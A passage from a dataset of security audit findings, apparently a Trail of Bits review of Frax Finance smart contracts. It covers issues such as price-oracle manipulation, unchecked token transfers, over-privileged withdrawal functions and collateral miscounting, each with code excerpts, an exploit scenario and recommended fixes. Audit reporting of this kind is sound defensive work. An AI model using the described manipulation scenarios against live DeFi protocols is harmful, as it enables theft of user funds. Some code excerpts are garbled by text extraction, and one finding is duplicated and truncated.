broadcast and executed, the global collateral ratio, collateral, and/or FXS prices change in such a way that Alice's minting operation is no longer protable for her. The minting operation is still executed, and Alice loses funds. Recommendations Short term, add the maxCollateralIn and maxFXSIn parameters to mintFrax , enabling users to make the transaction revert if the amount of collateral and FXS that they would have to pay is above acceptable limits. Long term, always add such limits to give users the ability to prevent unacceptably large input amounts and unacceptably small output amounts when those amounts are dynamically computed.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "12. Incorrect default price tolerance in CCFrax1to1AMM ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The price_tolerance state variable of the CCFrax1to1AMM contract is set to 50,000, which, when using the xed point scaling factor inconsistent with the variables inline comment, which indicates the number 5,000, corresponding to 0.005. A price tolerance of 0.05 is probably too high and can lead to unacceptable arbitrage activities; this suggests that price_tolerance should be set to the value indicated in the code comment. 6 1 0 , corresponds to 0.05. This is uint256 public price_tolerance = 50000 ; // E6. 5000 = .995 to 1.005 Figure 12.1: The price_tolerance state variable ( CCFrax1to1AMM.sol#56 ) Exploit Scenario This issue exacerbates the exploit scenario presented in issue TOB-FRSOL-008 . Given that scenario, but with a price tolerance of 50,000, Alice is able to gain $5459 through arbitrage. A higher price tolerance leads to higher arbitrage prots. Recommendations Short term, set the price tolerance to 5,000 both in the code and on the deployed contract. Long term, ensure that comments are in sync with the code and that constants are correct.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "13. Signicant code duplication ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "Signicant code duplication exists throughout the codebase. Duplicate code can lead to incomplete xes or inconsistent behavior (e.g., because the code is modied in one location but not in all). For example, the FraxUnifiedFarmTemplate.sol and StakingRewardsMultiGauge.sol les both contain a retroCatchUp function. As seen in gure 13.1, the functions are almost identical. // If the period expired, renew it function retroCatchUp () internal { // Pull in rewards from the // If the period expired, renew it function retroCatchUp () internal { // Pull in rewards from the rewards distributor rewards distributor rewards_distributor. distributeReward ( addr ess ( this )); rewards_distributor. distributeReward ( addr ess ( this )); // Ensure the provided reward // Ensure the provided reward amount is not more than the balance in the contract. amount is not more than the balance in the contract. // This keeps the reward rate in // This keeps the reward rate in the right range, preventing overflows due to the right range, preventing overflows due to // very high values of rewardRate // very high values of rewardRate in the earned and rewardsPerToken functions; in the earned and rewardsPerToken functions; // Reward + leftover must be less // Reward + leftover must be less than 2^256 / 10^18 to avoid overflow. than 2^256 / 10^18 to avoid overflow. uint256 num_periods_elapsed = uint256 num_periods_elapsed = uint256 ( block .timestamp - periodFinish) / rewardsDuration; // Floor division to the nearest period uint256 ( block .timestamp. sub (periodFinish) ) / rewardsDuration; // Floor division to the nearest period // Make sure there are enough // Make sure there are enough tokens to renew the reward period tokens to renew the reward period for ( uint256 i = 0 ; i < for ( uint256 i = 0 ; i < rewardTokens.length; i++){ rewardTokens.length; i++){ require (( rewardRates (i) * rewardsDuration * (num_periods_elapsed + 1 )) <= ERC20 (rewardTokens[i]). balanceOf ( address ( this )), string ( abi . encodePacked ( \"Not enough reward tokens available: \" , rewardTokens[i])) ); require ( rewardRates (i). mul (rewardsDuratio n). mul (num_periods_elapsed + 1 ) <= ERC20 (rewardTokens[i]). balanceOf ( address ( this )), string ( abi . encodePacked ( \"Not enough reward tokens available: \" , rewardTokens[i])) ); } } // uint256 old_lastUpdateTime = // uint256 old_lastUpdateTime = lastUpdateTime; lastUpdateTime; // uint256 new_lastUpdateTime = // uint256 new_lastUpdateTime = block.timestamp; block.timestamp; // lastUpdateTime = periodFinish; periodFinish = periodFinish + // lastUpdateTime = periodFinish; periodFinish = ((num_periods_elapsed + 1 ) * rewardsDuration); periodFinish. add ((num_periods_elapsed. add ( 1 )). mul (rewardsDuration)); // Update the rewards and time _updateStoredRewardsAndTime (); _updateStoredRewardsAndTime (); emit // Update the fraxPerLPStored fraxPerLPStored = RewardsPeriodRenewed ( address (stakingToken )); fraxPerLPToken (); } } Figure 13.1: Left: contracts/Staking/FraxUnifiedFarmTemplate.sol#L463-L490 Right: contracts/Staking/StakingRewardsMultiGauge.sol#L637-L662 Exploit Scenario Alice, a Frax Finance developer, is asked to x a bug in the retroCatchUp function. Alice updates one instance of the function, but not both. Eve discovers a copy of the function in which the bug is not xed and exploits the bug. Recommendations Short term, perform a comprehensive code review and identify pieces of code that are semantically similar. Factor out those pieces of code into separate functions where it makes sense to do so. This will reduce the risk that those pieces of code diverge after the code is updated. Long term, adopt code practices that discourage code duplication. Doing so will help to prevent this problem from recurring.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "14. StakingRewardsMultiGauge.recoverERC20 allows token managers to steal rewards ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The recoverERC20 function in the StakingRewardsMultiGauge contract allows token managers to steal rewards. This violates conventions established by other Frax Solidity contracts in which recoverERC20 can be called only by the contract owner. The relevant code appears in gure 14.1. The recoverERC20 function checks whether the caller is a token manager and, if so, sends him the requested amount of the token he manages. Convention states that this function should be callable only by the contract owner. Moreover, its purpose is typically to recover tokens unrelated to the contract. // Added to support recovering LP Rewards and other mistaken tokens from other systems to be distributed to holders function recoverERC20 ( address tokenAddress , uint256 tokenAmount ) external onlyTknMgrs ( tokenAddress ) { // Check if the desired token is a reward token bool isRewardToken = false ; for ( uint256 i = 0 ; i < rewardTokens.length; i++){ if (rewardTokens[i] == tokenAddress) { isRewardToken = true ; break ; } } // Only the reward managers can take back their reward tokens if (isRewardToken && rewardManagers[tokenAddress] == msg.sender ){ ERC20 (tokenAddress). transfer ( msg.sender , tokenAmount); emit Recovered ( msg.sender , tokenAddress, tokenAmount); return ; } Figure 14.1: contracts/Staking/StakingRewardsMultiGauge.sol#L798-L814 For comparison, consider the CCFrax1to1AMM contracts recoverERC20 function. It is callable only by the contract owner and specically disallows transferring tokens used by the contract. function recoverERC20 ( address tokenAddress , uint256 tokenAmount ) external onlyByOwner { require (!is_swap_token[tokenAddress], \"Cannot withdraw swap tokens\" ); TransferHelper. safeTransfer ( address (tokenAddress), msg.sender , tokenAmount); } Figure 14.2: contracts/Misc_AMOs/__CROSSCHAIN/Moonriver/CCFrax1to1AMM.sol#L340-L344 Exploit Scenario Eve tricks Frax Finance into making her a token manager for the StakingRewardsMultiGauge contract. When the contracts token balance is high, Eve withdraws the tokens and vanishes. Recommendations Short term, eliminate the token managers ability to call recoverERC20 . This will bring recoverERC20 in line with established conventions regarding the functions purpose and usage. Long term, regularly review all uses of contract modiers, such as onlyTknMgrs . Doing so will help to expose bugs like the one described here.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "15. Convex_AMO_V2 custodian can withdraw rewards ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The Convex_AMO_V2 custodian can withdraw rewards. This violates conventions established by other Frax Solidity contracts in which the custodian is only able to pause operations. The relevant code appears in gure 15.1. The withdrawRewards function is callable by the contract owner, governance, or the custodian. This provides signicantly more power to the custodian than other contracts in the Frax Solidity repository. function withdrawRewards ( uint256 crv_amt , uint256 cvx_amt , uint256 cvxCRV_amt , uint256 fxs_amt ) external onlyByOwnGovCust { if (crv_amt > 0 ) TransferHelper. safeTransfer (crv_address, msg.sender , crv_amt); if (cvx_amt > 0 ) TransferHelper. safeTransfer ( address (cvx), msg.sender , cvx_amt); if (cvxCRV_amt > 0 ) TransferHelper. safeTransfer (cvx_crv_address, msg.sender , cvxCRV_amt); if (fxs_amt > 0 ) TransferHelper. safeTransfer (fxs_address, msg.sender , fxs_amt); } Figure 15.1: contracts/Misc_AMOs/Convex_AMO_V2.sol#L425-L435 Exploit Scenario Eve tricks Frax Finance into making her the custodian for the Convex_AMO_V2 contract. When the unclaimed rewards are high, Eve withdraws them and vanishes. Recommendations Short term, determine whether the Convex_AMO_V2 custodian requires the ability to withdraw rewards. If so, document this as a security concern. This will help users to understand the risks associated with depositing funds into the Convex_AMO_V2 contract. Long term, implement a mechanism that allows rewards to be distributed without requiring the intervention of an intermediary. Reducing human involvement will increase users overall condence in the system.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "16. The FXS1559 documentation is inaccurate ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The FXS1559 documentation states that excess FRAX tokens are exchanged for FXS tokens, and the FXS tokens are then burned. However, the reality is that those FXS tokens are redistributed to veFXS holders. More specically, the documentation states the following: Specically, every time interval t, FXS1559 calculates the excess value above the CR [collateral ration] and mints FRAX in proportion to the collateral ratio against the value. It then uses the newly minted currency to purchase FXS on FRAX-FXS AMM pairs and burn it. However, in the FXS1559_AMO_V3 contract, the number of FXS tokens that are burned is a tunable parameter (see gures 16.1 and 16.2). The parameter defaults to, and is currently, 0 (according to Etherscan). burn_fraction = 0 ; // Give all to veFXS initially Figure 16.1: contracts/Misc_AMOs/FXS1559_AMO_V3.sol#L87 // Calculate the amount to burn vs give to the yield distributor uint256 amt_to_burn = fxs_received. mul (burn_fraction). div (PRICE_PRECISION); uint256 amt_to_yield_distributor = fxs_received. sub (amt_to_burn); // Burn some of the FXS burnFXS (amt_to_burn); // Give the rest to the yield distributor FXS. approve ( address (yieldDistributor), amt_to_yield_distributor); yieldDistributor. notifyRewardAmount (amt_to_yield_distributor); Figure 16.2: contracts/Misc_AMOs/FXS1559_AMO_V3.sol#L159-L168 Exploit Scenario Frax Finance is publicly shamed for claiming that FXS is deationary when it is not. Condence in FRAX declines, and it loses its peg as a result. Recommendations Short term, correct the documentation to indicate that some proportion of FXS tokens may be distributed to veFXS holders. This will help users to form correct expectations regarding the operation of the protocol. Long term, consider whether FXS tokens need to be redistributed. The documentation makes a compelling argument for burning FXS tokens. Adjusting the code to match the documentation might be a better way of resolving this discrepancy.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "17. Univ3LiquidityAMO defaults the price of collateral to $1 ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The Uniswap V3 AMOs default to a price of $1 unless an oracle is set, and it is not clear whether an oracle is or will be set. If the contract lacks an oracle, the contract will return the number of collateral units instead of the price of collateral, meaning that it will value each unit of collateral at $1 instead of the correct price. While this may not be an issue for stablecoins, this pattern is error-prone and unclear. It could introduce errors in the global collateral value of FRAX since the protocol may underestimate (or overestimate) the value of the collateral if the price is above (or below) $1. col_bal_e188 is the balance, not the price, of the tokens. When collatDolarValue is called without an oracle, the contract falls back to valuing each token at $1. function freeColDolVal() public view returns ( uint256 ) { uint256 value_tally_e18 = 0 ; for ( uint i = 0 ; i < collateral_addresses.length; i++){ ERC20 thisCollateral = ERC20(collateral_addresses[i]); uint256 missing_decs = uint256 ( 18 ).sub(thisCollateral.decimals()); uint256 col_bal_e18 = thisCollateral.balanceOf( address ( this )).mul( 10 ** missing_decs); uint256 col_usd_value_e18 = collatDolarValue(oracles[collateral_addresses[i]], col_bal_e18); value_tally_e18 = value_tally_e18.add(col_usd_value_e18); } return value_tally_e18; } Figure 17.1: contracts/Misc_AMOs/UniV3LiquidityAMO_V2.sol#L161-L171 function collatDolarValue (OracleLike oracle, uint256 balance ) public view returns ( uint256 ) { if ( address (oracle) == address ( 0 )) return balance; return balance.mul(oracle.read()).div( 1 ether); } Figure 17.2: contracts/Misc_AMOs/UniV3LiquidityAMO_V2.sol#L174-L177 Exploit Scenario The value of a collateral token is $0.50. Instead of incentivizing recollateralization, the protocol indicates that it is adequately collateralized (or overcollateralized). However, the price of the collateral token is half the $1 default value, and the protocol needs to respond to the insucient collateral backing FRAX. Recommendations Short term, integrate the Uniswap V3 AMOs properly with an oracle, and remove the hard-coded price assumptions. Long term, review and test the eect of each pricing function on the global collateral value and ensure that the protocol responds correctly to changes in collateralization.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "18. calc_withdraw_one_coin is vulnerable to manipulation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The showAllocations function determines the amount of collateral in dollars that a contract holds. calc_withdraw_one_coin is a Curve AMM function based on the current state of the pool and changes as trades are made through the pool. This spot price can be manipulated using a ash loan or large trade similar to the one described in TOB-FRSOL-006 . function showAllocations () public view returns (uint256[ 10 ] memory return_arr) { // ------------LP Balance------------ // Free LP uint256 lp_owned = (mim3crv_metapool.balanceOf(address(this))); // Staked in the vault uint256 lp_value_in_vault = MIM3CRVInVault(); lp_owned = lp_owned.add(lp_value_in_vault); // ------------3pool Withdrawable------------ uint256 mim3crv_supply = mim3crv_metapool.totalSupply(); uint256 mim_withdrawable = 0 ; uint256 _3pool_withdrawable = 0 ; if (lp_owned > 0 ) _3pool_withdrawable = mim3crv_metapool.calc_withdraw_one_coin(lp_owned, 1 ); // 1: 3pool index Figure 18.1: contracts/Misc_AMOs/MIM_Convex_AMO.sol#L145-160 Exploit Scenario MIM_Convex_AMO is included in FRAX.globalCollateralValue , and the FraxPoolV3.bonus_rate is nonzero. An attacker manipulates the return value of calc_withdraw_one_coin , causing the protocol to undervalue the collateral and reach a less-than-desired collateralization ratio. The attacker then calls FraxPoolV3.recollateralize , adds collateral, and sells the newly minted FXS tokens, including a bonus, for prot. Recommendations Short term, do not use the Curve AMM spot price to value collateral. Long term, use an oracle or get_virtual_price to reduce the likelihood of manipulation. References  Medium, \"Economic Attack on Harvest FinanceDeep Dive\"", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "19. Incorrect valuation of LP tokens ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The Frax Protocol uses liquidity pool (LP) tokens as collateral and includes their value in the global collateralization value. In addition to the protocols incorrect inclusion of FRAX as collateral (see TOB-FRSOL-024 ), the calculation of the value pool tokens representing Uniswap V2-like and Uniswap V3 positions is inaccurate. As a result, the global collateralization value could be incorrect. getAmount0ForLiquidity ( getAmount1ForLiquidity) returns the amount, not the value, of token0 (token1) in that price range; the price of FRAX should not be assumed to be $1, for the same reasons outlined in TOB-FRSOL-017 . The userStakedFrax helper function uses the metadata of each Uniswap V3 NFT to calculate the collateral value of the underlying tokens. Rather than using the current range, the function calls getAmount0ForLiquidty using the range set by a liquidity provider. This suggests that the current price of the assets is within the range set by the liquidity provider, which is not necessarily the case. If the market price is outside the given range, the underlying position will contain 100% of one token rather than a portion of both tokens. Thus, the underlying tokens will not be at a 50% allocation at all times, so this assumption is false. The actual redemption value of the NFT is not the same as what was deposited since the underlying token amounts and prices change with market conditions. In short, the current calculation does not update correctly as the price of assets change, and the global collateral value will be wrong. function userStakedFrax (address account ) public view returns (uint256) { uint256 frax_tally = 0 ; LockedNFT memory thisNFT; for (uint256 i = 0 ; i < lockedNFTs[account].length; i++) { thisNFT = lockedNFTs[account][i]; uint256 this_liq = thisNFT.liquidity; if (this_liq > 0 ){ uint160 sqrtRatioAX96 = TickMath.getSqrtRatioAtTick(thisNFT.tick_lower); uint160 sqrtRatioBX96 = TickMath.getSqrtRatioAtTick(thisNFT.tick_upper); if (frax_is_token0){ frax_tally = frax_tally.add(LiquidityAmounts.getAmount0ForLiquidity(sqrtRatioAX96, sqrtRatioBX96, uint128(thisNFT.liquidity))); } else { frax_tally = frax_tally.add(LiquidityAmounts.getAmount1ForLiquidity(sqrtRatioAX96, sqrtRatioBX96, uint128(thisNFT.liquidity))); } } } // In order to avoid excessive gas calculations and the input tokens ratios. 50% FRAX is assumed // If this were Uni V2, it would be akin to reserve0 & reserve1 math // There may be a more accurate way to calculate the above... return frax_tally.div( 2 ); } Figure 19.1: contracts/Staking/FraxUniV3Farm_Volatile.sol#L241-L263 In addition, the value of Uniswap V2 LP tokens is calculated incorrectly. The return value of getReserves is vulnerable to manipulation, as described in TOB-FRSOL-006 . Thus, the value should not be used to price LP tokens, as the value will vary signicantly when trades are performed through the given pool. Imprecise uctuations in the LP tokens values will result in an inaccurate global collateral value. function lpTokenInfo ( address pair_address ) public view returns ( uint256 [ 4 ] memory return_info) { // Instantiate the pair IUniswapV2Pair the_pair = IUniswapV2Pair(pair_address); // Get the reserves uint256 [] memory reserve_pack = new uint256 []( 3 ); // [0] = FRAX, [1] = FXS, [2] = Collateral ( uint256 reserve0 , uint256 reserve1 , ) = (the_pair.getReserves()); { // Get the underlying tokens in the LP address token0 = the_pair.token0(); address token1 = the_pair.token1(); // Test token0 if (token0 == canonical_frax_address) reserve_pack[ 0 ] = reserve0; else if (token0 == canonical_fxs_address) reserve_pack[ 1 ] = reserve0; else if (token0 == arbi_collateral_address) reserve_pack[ 2 ] = reserve0; // Test token1 if (token1 == canonical_frax_address) reserve_pack[ 0 ] = reserve1; else if (token1 == canonical_fxs_address) reserve_pack[ 1 ] = reserve1; else if (token1 == arbi_collateral_address) reserve_pack[ 2 ] = reserve1; } Figure 19.2: contracts/Misc_AMOs/__CROSSCHAIN/Arbitrum/SushiSwapLiquidityAMO_ARBI.sol #L196-L217 Exploit Scenario The value of LP positions does not reect a sharp decline in the market value of the underlying tokens. Rather than incentivizing recollateralization, the protocol continues to mint FRAX tokens and causes the true collateralization ratio to fall even further. Although the protocol appears to be solvent, due to incorrect valuations, it is not. Recommendations Short term, discontinue the use of LP tokens as collateral since the valuations are inaccurate and misrepresent the amount of collateral backing FRAX. Long term, use oracles to derive the fair value of LP tokens. For Uniswap V2, this means using the constant product to compute the value of the underlying tokens independent of the spot price. For Uniswap V3, this means using oracles to determine the current composition of the underlying tokens that the NFT represents. References   Christophe Michel, \"Pricing LP tokens | Warp Finance hack\" Alpha Finance, \"Fair Uniswap's LP Token Pricing\"", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "20. Missing check of return value of transfer and transferFrom ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "Some tokens, such as BAT, do not precisely follow the ERC20 specication and will return false or fail silently instead of reverting. Because the codebase does not consistently use OpenZeppelins SafeERC20 library, the return values of calls to transfer and transferFrom should be checked. However, return value checks are missing from these calls in many areas of the code, opening the TWAMM contract (the time-weighted automated market maker) to severe vulnerabilities. function provideLiquidity(uint256 lpTokenAmount) external { require (totalSupply() != 0 , 'EC3' ); //execute virtual orders longTermOrders.executeVirtualOrdersUntilCurrentBlock(reserveMap); //the ratio between the number of underlying tokens and the number of lp tokens must remain invariant after mint uint256 amountAIn = lpTokenAmount * reserveMap[tokenA] / totalSupply(); uint256 amountBIn = lpTokenAmount * reserveMap[tokenB] / totalSupply(); ERC20(tokenA).transferFrom( msg.sender , address( this ), amountAIn); ERC20(tokenB).transferFrom( msg.sender , address( this ), amountBIn); [...] Figure 20.1: contracts/FPI/TWAMM.sol#L125-136 Exploit Scenario Frax deploys the TWAMM contract. Pools are created with tokens that do not revert on failure, allowing an attacker to call provideLiquidity and mint LP tokens for free; the attacker does not have to deposit funds since the transferFrom call fails silently or returns false . Recommendations Short term, x the instance described above. Then, x all instances detected by slither . --detect unchecked-transfer . Long term, review the Token Integration Checklist in appendix D and integrate Slither into the projects CI pipeline to prevent regression and catch new instances proactively.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "21. A rewards distributor does not exist for each reward token ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The FraxUnifiedFarmTemplate contracts setGaugeController function (gure 21.1) has the onlyTknMgrs modier. All other functions with the onlyTknMgrs modier set a value in an array keyed only to the calling token managers token index. Except for setGaugeController , which sets the global rewards_distributor state variable, all other functions that set global state variables have the onlyByOwnGov modier. This modier is stricter than onlyTknMgrs , in that it cannot be called by token managers. As a result, any token manager can set the rewards distributor that will be used by all tokens. This exposes the underlying issue: there should be a rewards distributor for each token instead of a single global distributor, and a token manager should be able to set the rewards distributor only for her token. function setGaugeController ( address reward_token_address , address _rewards_distributor_address , address _gauge_controller_address ) external onlyTknMgrs(reward_token_address) { gaugeControllers[rewardTokenAddrToIdx[reward_token_address]] = _gauge_controller_address; rewards_distributor = IFraxGaugeFXSRewardsDistributor(_rewards_distributor_address); } Figure 21.1: The setGaugeController function ( FraxUnifiedFarmTemplate.sol#639642 ) Exploit Scenario Reward manager A calls setGaugeController to set his rewards distributor. Then, reward manager B calls setGaugeController to set his rewards distributor, overwriting the rewards distributor that A set. Later, sync is called, which in turn calls retroCatchUp . As a result, distributeRewards is called on Bs rewards distributor; however, distributeRewards is not called on As rewards distributor. Recommendations Short term, replace the global rewards distributor with an array that is indexed by token index to store rewards distributors, and ensure that the system calls distributeRewards on all reward distributors within the retroCatchUp function. Long term, ensure that token managers cannot overwrite each others settings.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Medium"]}, {"title": "22. minVeFXSForMaxBoost can be manipulated to increase rewards ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "minVeFXSForMaxBoost is calculated based on the current spot price when a user stakes Uniswap V2 LP tokens. If an attacker manipulates the spot price of the pool prior to staking LP tokens, the reward boost will be skewed upward, thereby increasing the amount of rewards earned. The attacker will earn outsized rewards relative to the amount of liquidity provided. function fraxPerLPToken () public view returns ( uint256 ) { // Get the amount of FRAX 'inside' of the lp tokens uint256 frax_per_lp_token ; // Uniswap V2 // ============================================ { [...] uint256 total_frax_reserves ; ( uint256 reserve0 , uint256 reserve1 , ) = (stakingToken.getReserves()); Figure 22.1: contracts/Staking/FraxCrossChainFarmSushi.sol#L242-L250 function userStakedFrax ( address account ) public view returns ( uint256 ) { return (fraxPerLPToken()).mul(_locked_liquidity[account]).div(1e18); } function minVeFXSForMaxBoost ( address account ) public view returns ( uint256 ) { return (userStakedFrax(account)).mul(vefxs_per_frax_for_max_boost).div(MULTIPLIER_PRECISION ); } function veFXSMultiplier ( address account ) public view returns ( uint256 ) { if ( address (veFXS) != address ( 0 )){ // The claimer gets a boost depending on amount of veFXS they have relative to the amount of FRAX 'inside' // of their locked LP tokens uint256 veFXS_needed_for_max_boost = minVeFXSForMaxBoost(account); [...] Figure 22.2: contracts/Staking/FraxCrossChainFarmSushi.sol#L260-L272 Exploit Scenario An attacker sells a large amount of FRAX through the incentivized Uniswap V2 pool, increasing the amount of FRAX in the reserve. In the same transaction, the attacker calls stakeLocked and deposits LP tokens. The attacker's reward boost, new_vefxs_multiplier , increases due to the large trade, giving the attacker outsized rewards. The attacker then swaps his tokens back through the pool to prevent losses. Recommendations Short term, do not use the Uniswap spot price to calculate reward boosts. Long term, use canonical and audited rewards contracts for Uniswap V2 liquidity mining, such as MasterChef.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "23. Most collateral is not directly redeemable by depositors ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The following describes the on-chain situation on December 20, 2021. The Frax stablecoin has a total supply of 1.5 billion FRAX. Anyone can mint new FRAX tokens by calling FraxPoolV3.mintFrax and paying the necessary amount of collateral and FXS. Conversely, anyone can redeem his or her FRAX for collateral and FXS by calling FraxPoolV3.redeemFrax . However, the Frax team manually moves collateral from the FraxPoolV3 contract into AMO contracts in which the collateral is used to generate yield. As a result, only $5 million (0.43%) of the collateral backing FRAX remains in the FraxPoolV3 contract and is available for redemption. If those $5 million are redeemed, the Frax Finance team would have to manually move collateral from the AMOs to FraxPoolV3 to make further redemptions possible. Currently, $746 million (64%) of the collateral backing FRAX is managed by the ConvexAMO contract. FRAX owners cannot access the ConvexAMO contract, as all of its operations can be executed only by the Frax team. Exploit Scenario Owners of FRAX want to use the FraxPoolV3 contracts redeemFrax function to redeem more than $5 million worth of FRAX for the corresponding amount of collateral. The redemption fails, as only $5 million worth of USDC is in the FraxPoolV3 contract. From the redeemers' perspectives, FRAX is no longer exchangeable into something worth $1, removing the base for its stable price. Recommendations Short term, deposit more FRAX into the FraxPoolV3 contract so that the protocol can support a larger volume of redemptions without requiring manual intervention by the Frax team. Long term, implement a mechanism whereby the pools can retrieve FRAX that is locked in AMOs to pay out redemptions.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Medium"]}, {"title": "24. FRAX.globalCollateralValue counts FRAX as collateral ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "Each unit of FRAX represents $1 multiplied by the collateralization ratio of debt. That is, if the collateralization ratio is 86%, the Frax Protocol owes each holder of FRAX $0.86. Instead of accounting for this as a liability, the protocol includes this debt as an asset backing FRAX. In other words, FRAX is backed in part by FRAX. Because the FRAX.globalCollateralValue includes FRAX as an asset and not debt, the true collateralization ratio is lower than stated, and users cannot redeem FRAX for the underlying collateral in mass for reasons beyond those described in TOB-FRSOL-023 . This issue occurs extensively throughout the code. For instance, the amount FRAX in a Uniswap V3 liquidity position is included in the contracts collateral value. function TotalLiquidityFrax () public view returns ( uint256 ) { uint256 frax_tally = 0 ; Position memory thisPosition; for ( uint256 i = 0 ; i < positions_array.length; i++) { thisPosition = positions_array[i]; uint128 this_liq = thisPosition.liquidity; if (this_liq > 0 ){ uint160 sqrtRatioAX96 = TickMath.getSqrtRatioAtTick(thisPosition.tickLower); uint160 sqrtRatioBX96 = TickMath.getSqrtRatioAtTick(thisPosition.tickUpper); if (thisPosition.collateral_address > 0x853d955aCEf822Db058eb8505911ED77F175b99e ){ // if address(FRAX) < collateral_address, then FRAX is token0 frax_tally = frax_tally.add(LiquidityAmounts.getAmount0ForLiquidity(sqrtRatioAX96, sqrtRatioBX96, this_liq)); } else { frax_tally = frax_tally.add(LiquidityAmounts.getAmount1ForLiquidity(sqrtRatioAX96, sqrtRatioBX96, this_liq)); } } } Figure 24.1: contracts/Misc_AMOs/UniV3LiquidityAMO_V2.sol#L199-L216 In another instance, the value of FRAX in FRAX/token liquidity positions on Arbitrum is counted as collateral. Again, FRAX should be counted as debt and not collateral. function lpTokenInfo ( address pair_address ) public view returns ( uint256 [ 4 ] memory return_info) { // Instantiate the pair IUniswapV2Pair the_pair = IUniswapV2Pair(pair_address); // Get the reserves uint256 [] memory reserve_pack = new uint256 []( 3 ); // [0] = FRAX, [1] = FXS, [2] = Collateral ( uint256 reserve0 , uint256 reserve1 , ) = (the_pair.getReserves()); { // Get the underlying tokens in the LP address token0 = the_pair.token0(); address token1 = the_pair.token1(); // Test token0 if (token0 == canonical_frax_address) reserve_pack[ 0 ] = reserve0; else if (token0 == canonical_fxs_address) reserve_pack[ 1 ] = reserve0; else if (token0 == arbi_collateral_address) reserve_pack[ 2 ] = reserve0; // Test token1 if (token1 == canonical_frax_address) reserve_pack[ 0 ] = reserve1; else if (token1 == canonical_fxs_address) reserve_pack[ 1 ] = reserve1; else if (token1 == arbi_collateral_address) reserve_pack[ 2 ] = reserve1; } // Get the token rates return_info[ 0 ] = (reserve_pack[ 0 ] * 1e18) / (the_pair.totalSupply()); return_info[ 1 ] = (reserve_pack[ 1 ] * 1e18) / (the_pair.totalSupply()); return_info[ 2 ] = (reserve_pack[ 2 ] * 1e18) / (the_pair.totalSupply()); // Set the pair type (used later) if (return_info[ 0 ] > 0 && return_info[ 1 ] == 0 ) return_info[ 3 ] = 0 ; // FRAX/XYZ else if (return_info[ 0 ] == 0 && return_info[ 1 ] > 0 ) return_info[ 3 ] = 1 ; // FXS/XYZ else if (return_info[ 0 ] > 0 && return_info[ 1 ] > 0 ) return_info[ 3 ] = 2 ; // FRAX/FXS else revert( \"Invalid pair\" ); } Figure 24.2: contracts/Misc_AMOs/__CROSSCHAIN/Arbitrum/SushiSwapLiquidityAMO_ARBI.sol #L196-L229 Exploit Scenario Users attempt to redeem FRAX for USDC, but the collateral backing FRAX is, in part, FRAX itself, and not enough collateral is available for redemption. The collateralization ratio does not accurately reect when the protocol is insolvent. That is, it indicates that FRAX is fully collateralized in the scenario in which 100% of FRAX is backed by FRAX. Recommendations Short term, revise FRAX.globalCollateralValue so that it does not count FRAX as collateral, and ensure that the protocol deposits the necessary amount of collateral to ensure the collateralization ratio is reached. Long term, after xing this issue, continue reviewing how the protocol accounts for collateral and ensure the design is sound.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "17. Univ3LiquidityAMO defaults the price of collateral to $1 ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "The Uniswap V3 AMOs default to a price of $1 unless an oracle is set, and it is not clear whether an oracle is or will be set. If the contract lacks an oracle, the contract will return the number of collateral units instead of the price of collateral, meaning that it will value each unit of collateral at $1 instead of the correct price. While this may not be an issue for stablecoins, this pattern is error-prone and unclear. It could introduce errors in the global collateral value of FRAX since the protocol may underestimate (or overestimate) the value of the collateral if the price is above (or below) $1. col_bal_e188 is the balance, not the price, of the tokens. When collatDolarValue is called without an oracle, the contract falls back to valuing each token at $1. function freeColDolVal() public view returns ( uint256 ) { uint256 value_tally_e18 = 0 ; for ( uint i = 0 ; i < collateral_addresses.length; i++){ ERC20 thisCollateral = ERC20(collateral_addresses[i]); uint256 missing_decs = uint256 ( 18 ).sub(thisCollateral.decimals()); uint256 col_bal_e18 = thisCollateral.balanceOf( address ( this )).mul( 10 ** missing_decs); uint256 col_usd_value_e18 = collatDolarValue(oracles[collateral_addresses[i]], col_bal_e18); value_tally_e18 = value_tally_e18.add(col_usd_value_e18); } return value_tally_e18; } Figure 17.1: contracts/Misc_AMOs/UniV3LiquidityAMO_V2.sol#L161-L171 function collatDolarValue (OracleLike oracle, uint256 balance ) public view returns ( uint256 ) { if ( address (oracle) == address ( 0 )) return balance; return balance.mul(oracle.read()).div( 1 ether); } Figure 17.2: contracts/Misc_AMOs/UniV3LiquidityAMO_V2.sol#L174-L177 Exploit Scenario The value of a collateral token is $0.50. 